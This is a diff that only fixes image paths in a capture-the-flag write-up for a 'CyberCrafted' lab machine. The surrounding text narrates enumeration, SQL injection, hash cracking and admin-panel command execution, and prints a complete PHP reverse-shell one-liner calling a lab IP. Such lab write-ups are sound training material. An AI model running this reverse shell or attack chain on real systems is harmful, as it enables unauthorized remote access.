@@ -86,47 +86,47 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Going to the webpage using the given IP address redirects to ***cybercrafted.thm*** domain, but fails to open a website.
 
-![Webpage Access Fail](/CyberCraftedimages/Webpage_Acces_Fail.png)
+![Webpage Access Fail](/CyberCrafted/images/Webpage_Acces_Fail.png)
 
 Adding the given IP address as cybercrafted.thm to the `/etc/hosts` file and reloading a page fixes the error.
 
-![Hosts File](/CyberCraftedimages/Hosts_File.png)
+![Hosts File](/CyberCrafted/images/Hosts_File.png)
 
-![Minecraft Page](/CyberCraftedimages/Minecraft_Page.png)
+![Minecraft Page](/CyberCrafted/images/Minecraft_Page.png)
 
 # Directory Enumeration
 
 Using `gobuster` tool and `common.txt` wordlist I was able to find three directories on the Minecraft server.
 
-![Directory Enumeration](/CyberCraftedimages/Directory_Enumeration.png)
+![Directory Enumeration](/CyberCrafted/images/Directory_Enumeration.png)
 
 One of found directories reveals three image files.
 
-![Image Files](/CyberCraftedimages/Image_Files.png)
+![Image Files](/CyberCrafted/images/Image_Files.png)
 
 # Subdomain Listing
 
 Viewing source code of the index page, there is a note telling that other subdomains are added.
 
-![Index Source](/CyberCraftedimages/Index_Source.png)
+![Index Source](/CyberCrafted/images/Index_Source.png)
 
 Using `wfuzz` tool, I found three subdomains for the webpage.
 
-![Subdomains](/CyberCraftedimages/Subdomains.png)
+![Subdomains](/CyberCrafted/images/Subdomains.png)
 
 The interesting ones are `admin` and `store`. Main pages on these subdomains were inaccessible, so I added the subdomains to `/etc/hosts` file and searched for `.php` files with gobuster.
 
 Admin subdomain has those files:
 
-![Admin Files](/CyberCraftedimages/Admin_Files.png)
+![Admin Files](/CyberCrafted/images/Admin_Files.png)
 
 And these could be found within the store subdomain:
 
-![Store Files](/CyberCraftedimages/Store_Files.png)
+![Store Files](/CyberCrafted/images/Store_Files.png)
 
 The store subdomain has a `search.php` file, which in turn shows the search panel:
 
-![Search Store](/CyberCraftedimages/Search_Store.png)
+![Search Store](/CyberCrafted/images/Search_Store.png)
 
 # Web Application Exploitation
 
@@ -138,27 +138,27 @@ SQL command:
 
 Found table:
 
-![Admin Table](/CyberCraftedimages/Admin_Table.png)
+![Admin Table](/CyberCrafted/images/Admin_Table.png)
 
 The table also has an admin's password hash. Using `john the ripper` with `rockyou.txt` wordlist has allowed me to crack the hash.
 
-![Admin Password](/CyberCraftedimages/Admin_Password.png)
+![Admin Password](/CyberCrafted/images/Admin_Password.png)
 
 # Reverse Shell
 
 The `admin` subdomain has an admin login panel.
 
-![Admin Panel](/CyberCraftedimages/Admin_Panel.png)
+![Admin Panel](/CyberCrafted/images/Admin_Panel.png)
 
 It is possible to log in using credentials found within the database. Correct credentials grant access to the ***admin panel*** where it is possible to run system commands.
 
-![Admin Commands](/CyberCraftedimages/Admin_Commands.png)
+![Admin Commands](/CyberCrafted/images/Admin_Commands.png)
 
 Next I have obtained a PHP reverse shell script from [PayloadsAllTheThings reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
 
 Then I have set up a `netcat` listener on my Kali machine.
 
-![Netcat Listener](/CyberCraftedimages/Netcat_Listener.png)
+![Netcat Listener](/CyberCrafted/images/Netcat_Listener.png)
 
 Executing the reverse shell command leads to a captured shell within the listener.
 
@@ -167,7 +167,7 @@ Reverse shell command:
 `php -r '$sock=fsockopen("10.9.9.47",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
 Reverse shell:
-![Reverse Shell](/CyberCraftedimages/Reverse_Shell.png)
+![Reverse Shell](/CyberCrafted/images/Reverse_Shell.png)
 
 # SSH Credentials
 
